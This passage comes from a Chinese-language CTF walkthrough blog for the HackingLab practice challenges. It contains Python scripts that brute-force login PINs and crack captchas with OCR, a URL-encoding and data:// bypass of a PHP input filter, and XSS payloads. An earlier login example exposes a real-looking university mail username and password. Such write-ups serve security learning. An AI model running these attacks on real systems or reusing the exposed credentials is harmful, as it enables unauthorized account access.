punctuation">[</span><span class="token string">'CityEntities'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'CityID'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#打印返回json中的某个key的value</span>    <span class="token keyword">print</span> data<span class="token punctuation">[</span><span class="token string">'ResponseStatus'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Ack'</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>sort_keys<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#树形打印json，ensure_ascii必须设为False否则中文会显示为unicode</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-xml请求"><a href="#3-xml请求" class="headerlink" title="3.xml请求"></a>3.xml请求</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/user/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">class</span> <span class="token class-name">url_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">""" init """</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Content-type'</span><span class="token punctuation">:</span> <span class="token string">'text/xml'</span><span class="token punctuation">}</span>    XML <span class="token operator">=</span> <span class="token string">'&lt;?xml version="1.0" encoding="utf-8"?>&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">&lt;soap:Body>&lt;Request xmlns="http://tempuri.org/">&lt;jme>&lt;JobClassFullName>WeChatJSTicket.JobWS.Job.JobRefreshTicket,WeChatJSTicket.JobWS&lt;/JobClassFullName>&lt;Action>RUN&lt;/Action>&lt;Param>1&lt;/Param>&lt;HostIP>127.0.0.1&lt;/HostIP>&lt;JobInfo>1&lt;/JobInfo>&lt;NeedParallel>false&lt;/NeedParallel>&lt;/jme>&lt;/Request>&lt;/soap:Body>&lt;/soap:Envelope>'</span>    url <span class="token operator">=</span> <span class="token string">'http://jobws.push.mobile.xxxxxxxx.com/RefreshWeiXInTokenJob/RefreshService.asmx'</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>XML<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#r.encoding = 'utf-8'</span>    data <span class="token operator">=</span> r<span class="token punctuation">.</span>text    <span class="token keyword">print</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-Requests模拟登入实例"><a href="#5-Requests模拟登入实例" class="headerlink" title="5.Requests模拟登入实例"></a>5.Requests模拟登入实例</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestspayload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'action:login'</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'uid'</span><span class="token punctuation">:</span><span class="token string">'08133248'</span><span class="token punctuation">,</span><span class="token string">'domain'</span><span class="token punctuation">:</span><span class="token string">'cumt.edu.cn'</span><span class="token punctuation">,</span><span class="token string">'nodetect'</span><span class="token punctuation">:</span><span class="token string">'false'</span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'wattcswh'</span><span class="token punctuation">,</span><span class="token string">'locale'</span><span class="token punctuation">:</span><span class="token string">'zh_CN'</span><span class="token punctuation">}</span>header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"mail.cumt.edu.cn"</span><span class="token punctuation">,</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0"</span><span class="token punctuation">,</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span><span class="token punctuation">,</span><span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span><span class="token punctuation">,</span><span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span><span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://acm.hdu.edu.cn/"</span><span class="token punctuation">,</span><span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"uid=08133248"</span><span class="token punctuation">,</span><span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"keep-alive"</span><span class="token punctuation">}</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://mail.cumt.edu.cn/coremail/index.jsp'</span><span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>status_code<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cookie的信息需要先通过抓包来获取</p><p>脚本分析：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding : utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> re   <span class="token comment" spellcheck="true">#正则表达式</span>url <span class="token operator">=</span> <span class="token string">'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'</span>head <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=98db957833ad06f20d20765aed472328'</span><span class="token punctuation">}</span>source <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>expression <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">'(\d+[+*])+(\d+[+*])+\((\d+[+*])+(\d+)\)'</span><span class="token punctuation">,</span> source<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span>val <span class="token operator">=</span> str<span class="token punctuation">(</span>eval<span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span>post <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'v'</span><span class="token punctuation">:</span> val<span class="token punctuation">}</span>result <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">,</span> data<span class="token operator">=</span>post<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>让脚本带着cookie值，以便于用户访问页面的时候进行身份验证。</p><p>重要的是后面的赋值给r2，r3的代码不理解，还是需要学python才行</p><h2 id="怎么就是不弹出key呢？"><a href="#怎么就是不弹出key呢？" class="headerlink" title="怎么就是不弹出key呢？"></a>怎么就是不弹出key呢？</h2><p>在<script>标签中，存在三个扰乱的函数return false；删除前三个函数，在本地重新执行代码（注：需有phpstudy环境支持），得到弹窗，截取前十四位字符，即为key：slakfjteslkjsd</p><h2 id="逗比验证码第一期"><a href="#逗比验证码第一期" class="headerlink" title="逗比验证码第一期"></a>逗比验证码第一期</h2><p>hint：进入登陆页面后，User信息已给出，密码提示为：<strong>第一位不为0的4位纯数字</strong>，但需要输入验证码登陆。</p><p>这是怎么个验证码漏洞：验证码的生成与cookie有关，所以脚本要围绕着cookie值来写</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding : utf-8 -*-</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php'</span><span class="token keyword">for</span> password <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=98db957833ad06f20d20765aed472328'</span><span class="token punctuation">}</span>    post <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'pwd'</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span> <span class="token string">'vcode'</span><span class="token punctuation">:</span> <span class="token string">'ws2b'</span><span class="token punctuation">,</span> <span class="token string">'submit'</span><span class="token punctuation">:</span> <span class="token string">'submit'</span><span class="token punctuation">}</span>    result <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">,</span> data<span class="token operator">=</span>post<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">9</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The passowrd is : "</span><span class="token operator">+</span>str<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>     <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样，既然是通过bp抓包获得的cookie，那么直接在bp里面爆破就行：1238</p><h2 id="逗比验证码第二期"><a href="#逗比验证码第二期" class="headerlink" title="逗比验证码第二期"></a>逗比验证码第二期</h2><p>hint：验证便失效的验证码</p><p>当验证码为空时可以实现爆破</p><h2 id="逗比的验证码第三期（SESSION）"><a href="#逗比的验证码第三期（SESSION）" class="headerlink" title="逗比的验证码第三期（SESSION）"></a>逗比的验证码第三期（SESSION）</h2><p>Tips:密码是4位数字，首位不是0<br>Tips2: SESSION</p><p>与第二期无异</p><h2 id="微笑一下就能过关"><a href="#微笑一下就能过关" class="headerlink" title="微笑一下就能过关"></a>微笑一下就能过关</h2><p>查看文件源代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>      <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type: text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'view-source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/\./'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">/**格式：'//'     * \的作用是将.进行转义使在''中能被转义出来    */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/%/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/http/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/https/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/ftp/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/telnet/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span> <span class="token punctuation">(</span><span class="token string">'/_/'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smile</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">file_exists</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$smile</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smile</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$smile</span> <span class="token operator">=</span> @<span class="token function">file_get_contents</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'^_^'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smile</span> <span class="token operator">===</span> <span class="token string">"(●'◡'●)"</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>  <span class="token delimiter">?></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>file_get_contents() 函数把整个文件一次性读入一个字符串中。</p><p>例子：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>输出：This is a test file with test text<span class="token punctuation">.</span><span class="token constant">PHP</span> Filesystem 函数<span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//全国，判断条件是$REQUEST_URI是否含有html</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>1.必须对&quot;^_^&quot;赋值2.&quot;^_^&quot;的值不能有  .  %  [0-9]  http  https  ftp  telnet  这些东西3.$_SERVER[&#39;QUERY_STRING&#39;],即&quot;^_^=(输入的值)&quot;这个字符串不能有 _ 这个字符4.满足$smile!=05.file_exists ($_GET[&#39;^_^&#39;])必须为0.也就是$_GET[&#39;^_^&#39;]此文件不存在6.&quot;$smile&quot;必须等于&quot;(●&#39;◡&#39;●)&quot;.也就是file_get_contents($_GET[&#39;^_^&#39;])必须为&quot;(●&#39;◡&#39;●)&quot;</code></pre><pre><code>仔细分析可以发现,第3点与第1点矛盾了,既要对&quot;^_^&quot;赋值,又得想办法去掉&quot;^_^&quot;中的&quot;_&quot;,那么可以采用Url编码变为&quot;%5f&quot;.这样第3点就满足了.所以我们输入就应该为&quot;^%5f^&quot;.继续分析第2点,这个地方把  http  https  ftp  telnet  这些给过滤了,而第6点又要通过file_get_contents()取出$_GET[&#39;^_^&#39;]里的值.而根据第5点,$_GET[&#39;^_^&#39;]又必须不存在.所以$_GET[&#39;^_^&#39;]只能是字符串&quot;(●&#39;◡&#39;●)&quot;,不可能是文件名.那么file_get_contents()里的参数应该是啥呢.查了一下,发现data://完美符合.所以我们输入就应该为&quot;^%5f^=data:,(●&#39;◡&#39;●)&quot;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdn.net/20161027135341809" alt="这里写图片描述"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdn.net/20161027135356098" alt="这里写图片描述"></p><p>payload：</p><pre><code>http://lab1.xseclab.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php?^%5f^=data:,(●&#39;◡&#39;●)</code></pre><p><a href="https://mp.weixin.qq.com/s?src=11&timestamp=1613478185&ver=2894&signature=ZsKKFmZlhTTbFrqZys6aaYlfeQ0BCbV*uMHZ*dm0s-ikbmwXPUY30xBoSEqCRGWhf7AhmMsbVOc*IX-Up5D3bIAGUQvWOf9gt0ykWsiOyB0dVxEYFSo7iK-DOTQEZVKL&new=1">file_get_contents("php://input")的使用方法</a></p><h2 id="逗比的手机验证码"><a href="#逗比的手机验证码" class="headerlink" title="逗比的手机验证码"></a>逗比的手机验证码</h2><p>hint：你的手机号码是13388886666，验证码将会以弹窗的形式给出</p><p>需要以13388886667的账号进行登录，所以利用6来获得验证码，登录的时候用7登录一样会成功</p><h2 id="基情燃烧的岁月"><a href="#基情燃烧的岁月" class="headerlink" title="基情燃烧的岁月"></a>基情燃烧的岁月</h2><p>Tips:你是一名黑客，你怀疑你的“（男/女）闺蜜”的出轨了，你要登陆TA手机的网上营业厅查看详单，一探究竟！ 闺蜜手机号码:13388886666</p><p>弹窗：手机验证码是：验证码发到手机上了，你看不到..是3位纯数字，开头不为0</p><p>意思应该是希望我们进行爆破，得到验证码为：200，</p><p>登录得到：你伤心的发现他/她正在跟你的前男/女友勾搭.....于是下决心看看前任除了跟你的（男/女）闺蜜勾搭，是不是还跟别的勾搭..<br>前任的手机号码是:13399999999，同理爆破得到：LKK8*(!@@sd</p><h2 id="验证码识别（未完成）"><a href="#验证码识别（未完成）" class="headerlink" title="验证码识别（未完成）"></a>验证码识别（未完成）</h2><p>Tips:验证码依然是3位数</p><p>软件利用pkav</p><p>脚本：需要安装tesseract-ocr模块，通过tesseract来识别验证码</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> pytesseract<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">import</span> syss <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php"</span>head <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'cookie'</span><span class="token punctuation">:</span> <span class="token string">'PHPSESSID=0a8197f36e6ab659fa5e0be5168b5b35'</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token number">100</span>    <span class="token keyword">while</span> num <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> get_code<span class="token punctuation">(</span><span class="token punctuation">)</span>        get_url<span class="token punctuation">(</span>num<span class="token punctuation">,</span> code<span class="token punctuation">)</span>        num <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">get_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlretrieve<span class="token punctuation">(</span><span class="token string">'http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php'</span><span class="token punctuation">,</span> <span class="token string">'1.png'</span><span class="token punctuation">)</span>    code <span class="token operator">=</span> pytesseract<span class="token punctuation">.</span>image_to_string<span class="token punctuation">(</span>Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">'1.png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    code <span class="token operator">=</span> code<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print(code)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'验证码是'</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span>            <span class="token keyword">return</span> code            <span class="token comment" spellcheck="true"># print(code)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"重新获取验证码！"</span><span class="token punctuation">)</span>            get_code<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> UnicodeEncodeError<span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">get_url</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'13388886666'</span><span class="token punctuation">,</span> <span class="token string">'mobi_code'</span><span class="token punctuation">:</span> num<span class="token punctuation">,</span> <span class="token string">'user_code'</span><span class="token punctuation">:</span> code<span class="token punctuation">,</span> <span class="token string">'Login'</span><span class="token punctuation">:</span> <span class="token string">'submit'</span><span class="token punctuation">}</span>    res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> u<span class="token string">'error'</span> <span class="token operator">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token string">'密码是'</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token string">'密码是'</span><span class="token punctuation">,</span> num<span class="token punctuation">,</span> <span class="token string">'---错误'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print("正在尝试...")</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="XSS关"><a href="#XSS关" class="headerlink" title="XSS关"></a>XSS关</h1><h2 id="XSS基础关"><a href="#XSS基础关" class="headerlink" title="XSS基础关"></a>XSS基础关</h2><p>XSS基础:很容易就可以过关.XSS类题目必须在平台登录才能进行.登录地址请参考左侧<子系统></p><p>payload：</p><pre><code>&lt;script&gt;alert(&#39;1&#39;);&lt;/script&gt;</code></pre><p>源代码文件中得到：alert("Please use alert(HackingLab)!!");</p><p>payload：</p><pre><code>&lt;script&gt;alert(HackingLab);&lt;/script&gt;</code></pre><p>key：myxssteststart!</p><h2 id="XSS基础2-简单绕过"><a href="#XSS基础2-简单绕过" class="headerlink" 